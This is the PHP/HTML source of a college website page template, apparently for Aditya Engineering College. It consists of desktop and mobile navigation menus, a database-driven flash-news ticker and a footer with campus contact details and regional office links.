                                        <ul class="mega-dropdown">
                                            <li class="row">
                                                <ul class="mega-col">
                                                    <li><a href="?p=Research_Eco_System">Research  & Innovation Eco System </a></li>
                                                    <li><a href="?p=Publications">Research Publications</a></li>
                                                    <li><a href="?p=Patents_Designs_Copy-Rights">Patents | Designs | Copy Rights</a></li>
                                                    <li><a href="research/Research_Projects/Research_Projects.pdf" target="_blank">Research Projects</a></li>
                                                    <li><a href="?p=incentive" target="blank">Research Incentives </a></li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </li>

                                    <li>
                                        <a href="#"><b>Examinations</b></a>
                                        <ul class="mega-dropdown">
                                            <li class="row">
                                                <ul class="mega-col">
                                                    <li class="has-child-menu"><a href="#">Online Payment</a>
                                                         <ul class="thired-level">
                                                            <li><a href="https://examsection.aec.edu.in/" target="blank"> Autonomous - Exam Fee Payment</a></li>
                                                            <li><a href="?p=Refund" target="blank">Refund and Cancellation</a></li>
                                                         </ul>
                                                    </li>
                                                    <li><a href="https://www.aec.edu.in/MALPRACTICES/MALPRACTICES%20RULES.pdf" target="_blank">Malpractice Rules</a></li>
                                                    <li class="has-child-menu"><a href="#">Examinations</a>
                                                         <ul class="thired-level">
                                                            <li><a href="?p=examination-autonomous"> Autonomous</a></li>
                                                            <li><a href="?p=examination-jntuk"> JNTUK</a></li>
                                                            <li><a href="?p=Annual_Report">Annual Report</a></li>
                                                        </ul>
                                                    </li>

                                                    <li class="has-child-menu"><a href="#">Toppers</a>
                                                         <ul class="thired-level">
                                                            <li><a href="?p=Batch-wise-toppers">Batch-wise Toppers</a></li>
                                                            <li><a href="?p=Academic-Year-Toppers"> Academic Year Toppers</a></li>
                                                        </ul>
                                                    </li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </li>

                                    <li>
                                        <a href="#"><b>Placements</b></a>
                                        <ul class="mega-dropdown mega-dropdownright">
                                            <li class="row">
                                                <ul class="mega-col">
                                                    <li class="has-child-menu left_menu"><a href="#">Placements</a>
                                                        <ul class="thired-level left_side"> 
                                                            <li><a href="?p=Placements">Placements</a></li>
                                                            <li><a href="?p=Placements-team">Placements Team</a></li>
                                                            <li><a href="?p=Campus-Placement-Training">Campus Placement Training</a></li>
                                                            <li><a href="https://placements.technicalhub.io/">Upcoming Campus Drives</a></li>
                                                            <li><a href="https://placements.technicalhub.io/admin/">Placements Admin Login</a></li>
                                                        </ul>
                                                    </li>

                                                    <li class="has-child-menu left_menu"><a href="#">Entrepreneurship</a>
                                                        <ul class="thired-level left_side">
                                                            <li><a href="http://getmybooks.com/" target="new">Get My Books</a></li>
                                                            <li><a href="http://getmytailor.com/" target="new">Get My Tailor</a></li>
                                                            <li><a href="http://hirepuppy.com/" target="new">Hire Puppy</a></li>
                                                            <li><a href="http://oasis-skill-assessment.epizy.com" target="new">Oasis</a></li>
                                                         </ul>
                                                     </li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </li>

                                    <li>
                                        <a href="#"><b>Campus life</b></a>
                                        <ul class="mega-dropdown mega-dropdownright">
                                            <li class="row">
                                                <ul class="mega-col">
                                                    <li class="has-child-menu"><a href="#">Activities</a>
                                                        <ul class="thired-level">
                                                            <li><a href="?p=Project-Hub"> Project Hub</a></li>
                                                           <!--  <li><a href="?p=Infosys-Campus-Connect">Infosys Campus Connect</a></li>
                                                            <li><a href="?p=MOOC's">MOOCs Online Course</a></li> -->
                                                            <li><a href="?p=Project-Club">Project Clubs</a></li>
                                                            <!-- <li><a href="?p=iot-lab">IoT HUB</a></li> -->
                                                        </ul>
                                                    </li>
                                                    <!-- <li class="has-child-menu"><a href="#">Events</a>
                                                        <ul class="thired-level">
                                                            <li><a href="?p=gokart">Karting Championship</a></li>
                                                            <li><a href="?p=Colours">Colors - Youth Fest</a></li>
                                                            <li><a href="?p=Veda">Veda - Tech Fest</a></li>
                                                            <li><a href="?p=Cricket-Tournaments">Cricket Tournaments</a></li>
                                                            <li><a href="?p=Campfire">Campfire</a></li>
                                                            <li><a href="?p=Event-Feedback-Form">Event Feedback Form</a></li>
                                                         </ul>
                                                    </li> -->
                                                    <li><a href="?p=Extension_Activities">Extension Activities</a></li>
                                                    <li><a href="?p=Training_programs">Training programs</a></li>
                                                    <li><a href="/souvenir" target="_blank">Souvenir</a></li>
                                                    <li><a href="https://aicte-india.org/feedback/">AICTE Feedback</a></li>

                                                    <li><a href="?p=Grievance_Redressal">Grievance Redressal</a></li>

                                                    <!-- <li><a href="?p=Grievance">Aditya Grievance Portal</a></li>
                                                    <li><a href="?p=WOMENS_GRIEVANCE_REDRESSAL">Womens Grievance Redressal Portal</a></li> -->
                                                   <!--  <li><a href="docs/CodeofConduct.pdf" target="_blank">Code of Conduct</a></li> -->
                                                    <li class="has-child-menu"><a href="#">ISTE</a>
                                                        <ul class="thired-level">
                                                            <li><a href="?p=ISTE-Students-Chapter"> ISTE Students Chapter</a></li>
                                                            <li><a href="?p=ISTE-Faculty-Chapter">ISTE Faculty Chapter</a></li>
                                                         </ul>
                                                     </li>
                                                    <li class="has-child-menu"><a href="#">Gallery</a>
                                                        <ul class="thired-level">
                                                            <li><a href="?p=Video">Videos</a></li>
                                                            <li><a href="?p=Media">Media</a></li>
                                                            <li><a href="?p=Campus-View360">Campus View 360</a></li>
                                                            <li><a href="?p=Gallery">View Gallery</a></li>
                                                         </ul>
                                                     </li>
                                                    <li class="has-child-menu"><a href="#">Facilities for physically Challenged People</a>
                                                        <ul class="thired-level">
                                                            <li><a href="?p=wheel_chair">Wheel Chair</a></li>
                                                            <li><a href="?p=wooden_ramp">Wooden Ramp</a></li>
                                                            <li><a href="?p=lift">Lift</a></li>
                                                            <li><a href="?p=tonilet">Western Toilet</a></li>
                                                        </ul>
                                                     </li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </li>


                                    


                                   

                                    <li>
                                        <a href="?p=IQAC"><b>IQAC</b></a>
                                    </li>
                                   <!--  <li>
                                        <a href="?p=nirf"><b>NIRF</b></a>
                                    </li> -->
                                    <li>
                                        <a href="?p=Alumni"><b>Alumni</b></a>
                                    </li>
                                    <li>
                                        <a href="#"><b>Infrastructure</b></a>
                                        <ul class="mega-dropdown">
                                            <li class="row">
                                                 <ul class="mega-col">
                                                   <li><a href="?p=IT_Infrastructure" target="_blank">IT Infrastructure</a></li>
                                                    <li class="has-child-menu left_menu"><a href="#">Facilities</a>
                                                        <ul class="thired-level left_side">
                                                            <li><a href="?p=Physical_facilities"> Physical Facilities</a></li>
                                                            <li><a href="?p=Library"> Library</a></li>
                                                            <li><a href="?p=Hostels">Hostels</a></li>
                                                            <li><a href="?p=Canteen-Food-Courts">Canteen & Food Courts</a></li>
                                                            <li><a href="?p=Sports_Facilities">Sports Facilities</a></li>
                                                            <li><a href="?p=Transport">Transport</a></li>
                                                            <li><a href="?p=Health Centre">Health Centre</a></li>
                                                            <li><a href="?p=Campus_Buildings">Campus Buildings</a></li>
                                                            <li><a href="?p=Geo_Tagged_Photographs"> Classrooms and Seminar Halls</a></li>
                                                            <li><a href="?p=Water_Conservation_Facilities">Water Conservation Facilities</a></li>
                                                            <li><a href="?p=Gender_Equity_Facilities">Gender Equity Facilities</a></li>
                                                            <li><a href="?p=Energy_Conservation">Energy Conservation</a></li>
                                                            <li><a href="?p=Waste_Management">Waste Management</a></li>
                                                            <li><a href="?p=Green_Campus">Green Campus</a></li>
                                                            <li><a href="?p=Differently_Abled_Friendly_Resources">Differently-Abled Friendly Resources</a></li>
                                                            <li><a href="?p=Maintenance">Maintenance</a></li>
                                                        </ul>
                                                    </li>
                                                        <li><a href="?p=e-Content_development">e-content Development</a></li>
                                                   <li class="has-child-menu left_menu"><a href="#">Downloads</a>
                                                        <ul class="thired-level left_side">
                                                           <!-- <li><a href="?p=Downloads">All Downloads</a></li>  -->
                                                           <li><a href="docs/Aditya Brochure 2022.pdf" target="new">AEC Prospects</a></li> 
                                                           <!-- <li><a href="Aditya_brochure" target="new">AEC Prospects</a></li> -->
                                                           
                                                           <li><a href="?p=Academic-Calender">Academic Calendar - JNTUK</a></li>
                                                           <li><a href="https://play.google.com/store/apps/details?id=info.campusnet.adityaconnect" target="new">Aditya Connect app</a></li>
                                                           <li><a href="?p=Media">Media</a></li>
                                                           <!-- <li><a href="?p=NewsLetters" target="new">Newsletters</a></li> -->
                                                           <li><a href="?p=mobile">Seized Mobiles</a></li>
                                                           <li><a href="?p=mandatory_disclosure">Mandatory disclosure</a></li>
                                                        </ul>
                                                    </li>
                                                       

                                                </ul>
                                            </li>

                                        </ul>
                                    </li>
                                    <li>
                                        <div class="admission_2024 admission_2024_1" id="navbar111">
                                            <b class="">Admissions </b>
                                            <div style="width:80%; margin: 10px auto; background-color: white; padding: 5px;height: 30px;border-radius:15px">
                                                <p style="line-height: 20px;"><a href="https://apply.adityauniversity.in/" target="_blank" style="color: #9a0000;"> <b class="button1">National</b></a></p>
                                            </div>
                                            <div style="width:80%; margin: 10px auto; background-color: white; padding: 5px;height: 30px;border-radius:15px">
                                                <p style="line-height: 20px;"><a href="https://www.aditya.ac.in/international/" target="_blank" style="color: #9a0000;"> <b class="button1">International</b></a></p>
                                            </div>
                                        </div>
                                    </li>

                                    

<!--                                           <li>
                                        <a href="#"><b>Downloads</b></a>
                                        <ul class="mega-dropdown mega-dropdownright" style="left: -82px;">
                                            <li class="row">
                                                <ul class="mega-col">
                                                    <li><a href="?p=Downloads">All Downloads</a></li> 
                                                    <li><a href="docs/Aditya Brochure 2022.pdf" target="new">AEC Prospects</a></li> 
                                                    <li><a href="Aditya_brochure" target="new">AEC Prospects</a></li>
                                                    
                                                    <li><a href="?p=Academic-Calender">Academic Calendar - JNTUK</a></li>
                                                    <li><a href="https://play.google.com/store/apps/details?id=info.campusnet.adityaconnect" target="new">Aditya Connect app</a></li>
                                                    <li><a href="?p=Media">Media</a></li>
                                                    <li><a href="?p=NewsLetters" target="new">Newsletters</a></li>
                                                    <li><a href="?p=mobile">Seized Mobiles</a></li>
                                                    <li><a href="#">Mandatory disclosure</a></li>
                                                  
                                                </ul>
                                            </li>
                                        </ul>
                                    </li> -->
                                    
                                        
                                   
                                </ul>
                            </nav>
                        </div>

                        <div class="col-lg-1 col-md-1 hidden-sm">

                        </div>
                    </div>
                </div>
            </div>



            <!-- Mobile Menu Area Start -->
            <div class="mobile-menu-area">
                <div class="container">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="mobile-menu">
                                <nav id="dropdown">
                                    <ul>
                                        <li>
                                            <a href="https://aec.edu.in"><b class="tab_heading">Home</b></a>
                                        </li>
                                        <li>
                                            <a href="#"><b class="tab_heading">About Us</b></a>
                                               <ul>
                                                   <a href="?p=About_college">About College</a>
                                                    <a href="?p=Accreditations">Accreditations</a>
                                                    <a href="?p=Approvals_Affiliation">Approvals / Affiliation</a>
                                                    <a href="?p=Autonomous">Governance</a>
                                                    <a href="https://www.aec.edu.in/?p=Research_Eco_System#tab6">MoUs</a>
                                                    <a href="/docs/MANDATORY DISCLOSURE.pdf" target='_new'>Mandatory Disclosure</a>
                                               </ul>
                                        </li>
                                        <li>
                                            <a href="#"><b class="tab_heading">Academics</b></a>
                                            <ul>
                                                <a href="?p=Academics_Admissions">Admissions</a>
                                                <a href="?p=Regulations">Regulations</a>
                                                <a href="?p=Academic-Calenders">Academic Calendars</a>

                                            
                                                <a href="#"><b class="tab_heading">Departments</b></a>
                                                <a href ="?p=CIVIL">Civil Engineering</a>
                                                <a href ="?p=EEE">Electrical and Electronics Engineering</a>
                                                <a href ="?p=MECH">Mechanical Engineering</a>
                                                <a href ="?p=ECE">Electronics and Communication Engineering</a>
                                                <a href ="?p=CSE">Computer Science and Engineering</a>
                                                <a href ="?p=Data_Science">Computer Science and Engineering (Data Science)</a>
                                                <a href ="?p=IT">Information Technology</a>
                                                <a href ="?p=MNE">Mining Engineering</a>
                                                <a href ="?p=PT">Petroleum Technology</a>
                                                <a href ="?p=AGRI">Agricultural Engineering</a>
                                                <a href ="?p=AIML">Artificial Intelligence & Machine Learning</a>
                                                <a href ="?p=Management-Studies">Department of Management Studies</a>
                                                <a href ="?p=MCA"></a>
                                                <a href ="?p=Humanities-Sceinces">Department of Humanities-Sciences</a>
                                                <a href="?p=About_T-Hub">About T-Hub</a>


                                                <a href="?p=Outcomebased Education"><b>Outcome-based Education(OBE)</b></a>
                                                <a href="?p=AutonomousSyllabus">Syllabus</a>
                                                <a href="?p=Holidays">Holidays</a>
                                                <a href="?p=StakeholderFeedback">Stakeholder's Feedback</a>
                                                <a href="?p=Mentoring_System">Mentoring System</a>
                                                <!-- <a href="?p=Staff_Directory">Staff Directory</a> -->
                                           </ul>
                                        </li>

                                        <li>
                                            <a href="#"><b class="tab_heading">Research</b></a>
                                            <ul>
                                             <a href="?p=Research_Eco_System">Research  & Innovation Eco System </a>
                                             <a href="?p=Publications">Research Publications</a>
                                             <a href="?p=Patents_Designs_Copy-Rights">Patents | Designs | Copy Rights</a>
                                             <a href="research/Research_Projects/Research_Projects.pdf" target="_blank">Research Projects</a>
                                             <a href="?p=incentive" target="blank">Research Incentives </a>   
                                            </ul>
                                        </li>

                                        <li>
                                            <a href="#"><b class="tab_heading">Examinations</b></a>
                                            <ul> 
                                             <li>&nbsp;&nbsp;&nbsp;&nbsp;Online Payment</li>       
                                             <a href="https://examsection.aec.edu.in/" target="blank"> Autonomous - Exam Fee Payment</a>
                                             <a href="?p=Refund" target="blank">Refund and Cancellation</a>
                                             <li></li>  
                                             <a href="https://www.aec.edu.in/MALPRACTICES/MALPRACTICES%20RULES.pdf" target="_blank">Malpractice Rules</a>

                                               <li>&nbsp;&nbsp;&nbsp;&nbsp;Examinations</li>
                                                <a href="?p=examination-autonomous"> Autonomous</a>
                                                <a href="?p=examination-jntuk"> JNTUK</a>
                                                <a href="?p=Annual_Report">Annual Report</a>

                                               <li>&nbsp;&nbsp;&nbsp;&nbsp;Toppers</li>
                                                <a href="?p=Batch-wise-toppers">Batch-wise Toppers</a>
                                                <a href="?p=Academic-Year-Toppers"> Academic Year Toppers</a>
                                            </ul>
                                        </li>
                                       

                                        <li>
                                            <a href="#"><b class="tab_heading">Placements</b></a>
                                            <ul>        
                                                       <a href="?p=Placements">Placements</a>
                                                        <a href="?p=Placements-team">Placements Team</a>
                                                        <a href="?p=Campus-Placement-Training">Campus Placement Training</a>
                                                        <a href="https://placements.technicalhub.io/">Upcoming Campus Drives</a>
                                                        <a href="https://placements.technicalhub.io/admin/">Placements Admin Login</a>
                                                
                                                
                                                   <li>&nbsp;&nbsp;&nbsp;&nbsp;Entrepreneurship</li>
                                                   <a href="http://getmybooks.com/" target="new">Get My Books</a>
                                                   <a href="http://getmytailor.com/" target="new">Get My Tailor</a>
                                                   <a href="http://hirepuppy.com/" target="new">Hire Puppy</a>
                                                   <a href="http://oasis-skill-assessment.epizy.com" target="new">Oasis</a>
                                               
                                            </ul>
                                        </li>

                                         
                                        

                                        
                                        <li>
                                            <a href="#"><b class="tab_heading">Campus life</b></a>
                                            <ul>
                                                    <li><b>&nbsp;&nbsp;&nbsp;&nbsp;Activities</b></li>
                                                    <a href="?p=Project-Hub"> Project Hub</a>
                                                   <!--  <a href="?p=Infosys-Campus-Connect">Infosys Campus Connect</a>
                                                    <a href="?p=MOOC's">MOOCs Online Course</a> -->
                                                    <a href="?p=Project-Club">Project Clubs</a>
                                                    <!-- <a href="?p=iot-lab">IoT HUB</a> -->
                                                 
                                                    <li></li>
                                                    <a href="/souvenir" target="_blank">  Souvenir</a>

                                                    <!-- <li><b>&nbsp;&nbsp;&nbsp;&nbsp;Events</b></li>
                                                    <a href="?p=gokart">Karting Championship</a>
                                                    <a href="?p=Colours">Colors - Youth Fest</a>
                                                    <a href="?p=Veda">Veda - Tech Fest</a>
                                                    <a href="?p=Cricket-Tournaments">Cricket Tournaments</a>
                                                    <a href="?p=Campfire">Campfire</a>
                                                    <a href="?p=Event-Feedback-Form">Event Feedback Form</a> -->
                                                 
                                                   <li></li>
                                                    <a href="?p=Extension_Activities">Extension Activities</a>
                                                    <a href="?p=Training_programs">Training programs</a>
                                                    <a href="/souvenir" target="_blank">Souvenir</a>
                                                    <a href="https://aicte-india.org/feedback/">AICTE Feedback</a>
                                                    <a href="?p=Grievance_Redressal">Grievance Redressal</a>
                                                   <!--  <a href="?p=Grievance">Aditya Grievance Portal</a>
                                                    <a href="?p=WOMENS_GRIEVANCE_REDRESSAL">Womens Grievance Redressal Portal</a> -->

                                                   <li><b>&nbsp;&nbsp;&nbsp;&nbsp;ISTE</b></li> 
                                                    <a href="?p=ISTE-Students-Chapter"> ISTE Students Chapter</a>
                                                    <a href="?p=ISTE-Faculty-Chapter">ISTE Faculty Chapter</a>
                                                
                                                    <li><b>&nbsp;&nbsp;&nbsp;&nbsp;Gallery</b> </li>
                                                    <a href="?p=Video">Videos</a>
                                                    <a href="?p=Media">Media</a>
                                                    <a href="?p=Campus-View360">Campus View 360</a>
                                                    <a href="?p=Gallery">View Gallery</a>
                                               
                                                    <li><b>&nbsp;&nbsp;&nbsp;&nbsp;Facilities for physically Challenged People</b></li>
                                                    <a href="?p=wheel_chair">Wheel Chair</a>
                                                    <a href="?p=wooden_ramp">Wooden Ramp</a>
                                                    <a href="?p=lift">Lift</a>
                                                    <a href="?p=tonilet">Western Toilet</a>
                                                
                                            </ul>
                                        </li>
                                        <li>
                                            <a href="?p=IQAC"><b class="tab_heading">IQAC</b></a>
                                        </li>
                                         <!-- <li>
                                            <a href="?p=nirf"><b class="tab_heading">NIRF</b></a>
                                        </li> -->
                                        
                                        <li>
                                            <a href="#"><b class="tab_heading">Infrastructure</b></a>
                                            <ul>
                                                <a href="IT_Infrastructure/IT_Upgradation.pdf" target="_blank">IT Infrastructure</a>
                                                 
                                                <li><b>&nbsp;&nbsp;&nbsp;&nbsp;Facilities</b> </li>
                                                    <a href="?p=Physical_facilities"> Physical Facilities</a>
                                                    <a href="?p=Library"> Library</a>
                                                    <a href="?p=Hostels">Hostels</a>
                                                    <a href="?p=Canteen-Food-Courts">Canteen & Food Courts</a>
                                                    <a href="?p=Sports_Facilities">Sports Facilities</a>
                                                    <a href="?p=Transport">Transport</a>
                                                    <a href="?p=Health Centre">Health Centre</a>
                                                    <a href="?p=Campus_Buildings">Campus Buildings</a>
                                                    <a href="?p=Geo_Tagged_Photographs"> Classrooms and Seminar Halls</a>
                                                    <a href="?p=Water_Conservation_Facilities">Water Conservation Facilities</a>
                                                    <a href="?p=Gender_Equity_Facilities">Gender Equity Facilities</a>
                                                    <a href="?p=Energy_Conservation">Energy Conservation</a>
                                                    <a href="?p=Waste_Management">Waste Management</a>
                                                    <a href="?p=Green_Campus">Green Campus</a>
                                                    <a href="?p=Differently_Abled_Friendly_Resources">Differently-Abled Friendly Resources</a>
                                                    <a href="?p=Maintenance">Maintenance</a>
                                               <li></li>
                                                  <a href="?p=e-Content_development">e-content Development</a>
                                                 
                                            </ul>
                                        </li>
                                        
                                        <li>
                                            <a href="#"><b class="tab_heading">DOWNLOADS</b></a>
                                            <ul>
                                                    <!-- <a href="?p=Downloads">All Downloads</a> -->
                                                    <!-- <a href="docs/Aditya Brochure 2022.pdf" target="new">AEC Prospects</a> -->
                                                    <a href="Aditya_brochure" target="new">AEC Prospects</a>

                                                    <a href="?p=Academic-Calender">Academic Calendar - JNTUK</a>
                                                    <a href="?p=Academic-Calenders1">Academic Calendar - Autonomous</a>
                                                    <a href="https://play.google.com/store/apps/details?id=info.campusnet.adityaconnect" target="new">Aditya Connect app</a>
                                                    <a href="?p=Media">Media</a>
                                                    <!-- <a href="?p=NewsLetters" target="new">Newsletters</a> -->
                                                    <a href="?p=mobile">Seized Mobiles</a>
                                            </ul> 
                                        </li>
                                        <li>
                                             <a href="#"><b class="tab_heading">Admissions</b></a>
                                            <ul>
                                                <a href="https://apply.adityauniversity.in/" target="new">National</a>
                                                <a href="https://www.aditya.ac.in/international/">International</a>
                                           <!--  <div class="admission_2024" id="navbar111">
                                                <b class="">Admissions </b>
                                                <div style="width:80%; margin: 10px auto; background-color: white; padding: 5px;height: 30px;border-radius:15px">
                                                    <p style="line-height: 20px;"><a href="admission/" target="_blank" style="color: #9a0000;"> <b class="button1">National</b></a></p>
                                                </div>
                                                <div style="width:80%; margin: 10px auto; background-color: white; padding: 5px;height: 30px;border-radius:15px">
                                                    <p style="line-height: 20px;"><a href="https://www.aditya.ac.in/international/" target="_blank" style="color: #9a0000;"> <b class="button1">International</b></a></p>
                                                </div>
                                            </div> -->
                                           </ul>
                                        </li>
                                        

                                       
                                </nav>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Mobile Menu Area End -->
        </div>
    </header>
    <!-- Header Area End Here -->

    <?php include ('includes/config.php'); ?>
     

    <?php
    if (empty(filter_input(INPUT_GET, 'p'))) {
        $query = "SELECT * FROM `flashnews` WHERE  `status`='1' ORDER BY `id` DESC";
        $result = mysqli_query($con, $query);
        $row_count = mysqli_num_rows($result);
        if ($row_count>0) { ?>
            <!--Flash New-->
            <div class="ticker-container" style="margin: 2px 0 0 0;">
                <div class="ticker-caption text-left" >
                    <p style="font-size: 20px;padding: 0 5px; font-weight: normal;font-family: robo;" >Flash News</p>
                </div>
<!-- 
                <a href="?p=nirf" class="pull-right" target="_blank" style="color: #ffffff !important; position: relative; right: 20px; font-size: 22px; z-index: 999; bottom: 2px;font-family: robo">NIRF</a> -->

               <!--  <a href="uploads/ARI-C-17952.pdf" class="pull-right hidden-xs" target="_blank" style="color: #fd752c !important; position: relative; right: 40px; font-size: 22px; font-weight: bold; z-index: 999; bottom: 2px; font-family: robo">&nbsp;  ARIIA 2019-20&nbsp;|</a> 
                <a href="uploads/ARI-C-17952.pdf" class="pull-right visible-xs" target="_blank" style="color: orange !important; position: relative; right: 40px; font-size: 14px; font-weight: bold; z-index: 999;margin-top: 5px;font-family: robo">ARIIA 2019-20</a>

                <a href="?p=Merit_Scholarship" class="pull-right hidden-xs" target="_blank" style="color: #e5e1e0 !important; position: relative; right: 40px; font-size: 22px; font-weight: bold; z-index: 999; bottom: 2px; font-family: robo">&nbsp;Merit Scholarship&nbsp;|</a> 

                <a href="?p=Merit_Scholarship" class="pull-right visible-xs" target="_blank" style="color: #ffff !important; position: relative; right: 40px; font-size: 14px; font-weight: bold; z-index: 999;margin-top: 5px;font-family: robo">Merit Scholarship |</a> -->



                <!-- </div> -->
                <ul>
                    <?php
                    $result = mysqli_query($con, "SELECT * FROM `flashnews` WHERE  `status`='1' order by `id` desc");
                    while($row = mysqli_fetch_array($result)) {
                        if ($row_count=='1') {
                            ?>
                            <div>
                                <li><a style="text-decoration: none;" target="_blank" href="<?php echo $row['Link'] ?>"><span style="color: #fff"><?php echo $row['news']; ?> </span><?php echo $row['link_name']; ?> </a></li>
                            </div>
                            <?php
                        }
                        ?>
                        <div>
                            <li><a style="text-decoration: none;" target="_blank" href="<?php echo $row['Link'] ?>"><span style="color: #fff"><?php echo $row['news']; ?> </span><?php echo $row['link_name']; ?> </a></li>
                        </div>

                        <?php
                    }
                    ?>
                </ul>
            </div>
            <div class="pull-right" style="display:block;background:#001a39;color:#ffffff;font-weight:bold;width: 100%;display: none;">
                <div id="marquee1" style="display:none;">
                    <marquee width="100%" direction="left" height="16px" onmouseover="this.stop();" onmouseout="this.start();">
                        <a href="https://adityauniversity.in/static/media/FDP.1e3166720147290fc269.pdf" target="_blank" style="color: white;">
                            ATAL FDP on “AI & ML Empowerment in Energy Storage and Advanced Robotics” from 9th to 14th December 2024, Organized by Department of Mechanical Engineering.
                        </a>
                    </marquee>
                </div>
               <!--  <div id="marquee2" style="display:none;">
                    <marquee width="100%" direction="left" height="16px" onmouseover="this.stop();" onmouseout="this.start();">
                        <a href="https://adityauniversity.in/static/media/event1.d4eb0ced0232592ba4a2.png" target="_blank" style="color: white;">
                            An Online Lecture Series on "Emerging Trends of Research in Electrical Engineering" from 6th to 16th November 2024, Organized by Aditya Learning Academy (ALA).
                        </a>
                    </marquee>
                </div> -->
                <div id="marquee3" style="display:none;">
                    <marquee width="100%" direction="left" height="16px" onmouseover="this.stop();" onmouseout="this.start();">
                        <a href="https://adityauniversity.in/static/media/event.4acddd40e759ff792242.png" target="_blank" style="color: white;">
                            An Online Lecture Series on "Research Scope in Emerging Areas of Civil Engineering" from 20th to 30th November 2024, Organized by Aditya Learning Academy (ALA).
                        </a>
                    </marquee>
                </div>
            </div>

            <?php 
        } 
    }
    ?>

  <!--   <center>
        <div class="container" style="margin-left: 10px !important">
        <div class="popup_this_container">
            <div id="popup_this" class="animate__animated animate__backInDown">
                <span class="button b-close" id="b-close">
                    <span><b style="margin-left: -3px">X</b></span>
                </span>
                <img src="POPUPNEW.jpg">
            </div>
        </div>
    </div>
</center> -->

    <?php include 'includes/pages.php'; ?>

   <footer>
        <div class="footer-area-top">
            <div class="container">
                <div class="row" style="margin-bottom: 30px">
                    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                        <div class="footer-box">
                            <a href="https://aec.edu.in"><img class="img-responsive" src="adityanew/images/au_2.png" alt="logo"></a>
                            <div class="footer-about">
                            </div>
                            <center>
                                <ul class="footer-social">
                                    <li>
                                       <a href="https://www.facebook.com/AECaditya" target="_blank"><i class="fa fa-facebook" aria-hidden="true" style="color: #fff;"></i>
                                       </a>
                                   </li>
                                   <li>
                                       <a href="https://twitter.com/AdityaEnggClg" target="_blank"><i class="fa fa-twitter" aria-hidden="true" style="color: #fff;"></i>
                                       </a>
                                   </li>
                                   <li>
                                       <a href="https://www.youtube.com/channel/UCQmzQy9b4i6Q6X86DkX1H1g" target="_blank"><i style="font-size:20px;color: #fff" class="fa" aria-hidden="true">&#xf167;</i>
                                       </a>
                                   </li>
                                   <li>
                                       <a href="https://api.whatsapp.com/send?phone=+919949876662"  target="_blank"><i style="font-size:20px;color: #fff" class="fa" aria-hidden="true">&#xf232;</i>
                                       </a>
                                   </li>
                                   <li><a href="http://instagram.com/aditya_engg_colleges"  target="_blank"><i class="fa fa-instagram" aria-hidden="true" style="font-size:20px;color: #fff"></i></a></li>

                               </ul>
                           </center>

                       </div>
                   </div>

                   <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                    <div class="footer-box ">
                     <p><i class="glyphicon glyphicon-map-marker"></i> ADITYA UNIVERSITY <br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aditya Nagar, ADB Road, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Surampalem - Pin:533437 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kakinda District,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Andhra Pradesh, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INDIA. </p>
                     <p><i class="glyphicon glyphicon-phone"></i> Phone : &nbsp;0884-23 26 202,<br/>
                         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                         +91 99498 76662,<br/>
                         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                     +91 99897 76661</p>
                     <p><i class="glyphicon glyphicon-phone"></i> Whats App : +91 7036076661</p>
                     <p><i class="glyphicon glyphicon-print"></i> Fax : 0884-2326203</p>
                     <p><i class="glyphicon glyphicon-envelope text-left"></i> E-mail : office@aec.edu.in</p>
                 </div>
             </div>
                     <div class="col-md-3 ">
                        <h6 class="heading7 footer_border">REACH US : <a href="?p=Campus-View360" target="blank" class="pull-right btn btn-info" data-toggle="tooltip" title="360 view" style="color: #fff; background: #46b8da">360<sup>0</sup> View</a></h6>
                        <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15255.051238626042!2d82.0645157!3d17.0842509!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x481e8b12b4b80715!2sAditya+Engineering+College!5e0!3m2!1sen!2sin!4v1488437966323" width="auto" height="250" frameborder="0" > </iframe>
                      </div>
             <div class="col-lg-2 col-md-2 col-md-offset-1 col-sm-6 col-xs-12">
                <div class="footer-box">
                    <h6 class="heading7 ">OFFICES</h6>
                    <div class="regional fa-ul">
                       <!-- <p><a href="?p=Andaman#Andaman"><i class="fa-li fa fa-angle-double-right" style="color: white"></i>Andaman</a></p> -->
                       <p><a href="?p=office#office"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Corporate office</a></p>
                       <p><a href="?p=Admissions#Admissions"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>International Admissions</a></p>

                       <p><a href="?p=Bihar#Bihar"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Bihar</a></p>
                       <p><a href="?p=Jharkand#Jharkand"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Jharkhand</a></p>
                       <p><a href="?p=Kerala#Kerala"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Kerala</a></p>
                       <p><a href="?p=Bangladesh#Bangladesh"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Bangladesh</a></p>
                       <p><a href="?p=West Bengal#West Bengal"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>West Bengal</a></p>
                   </div>
               </div>
           </div>
       </div>
   </div>
<div class="footer-area-bottom ">

<div class="copyright" style="background-color: #001a39">
    <div class="container">
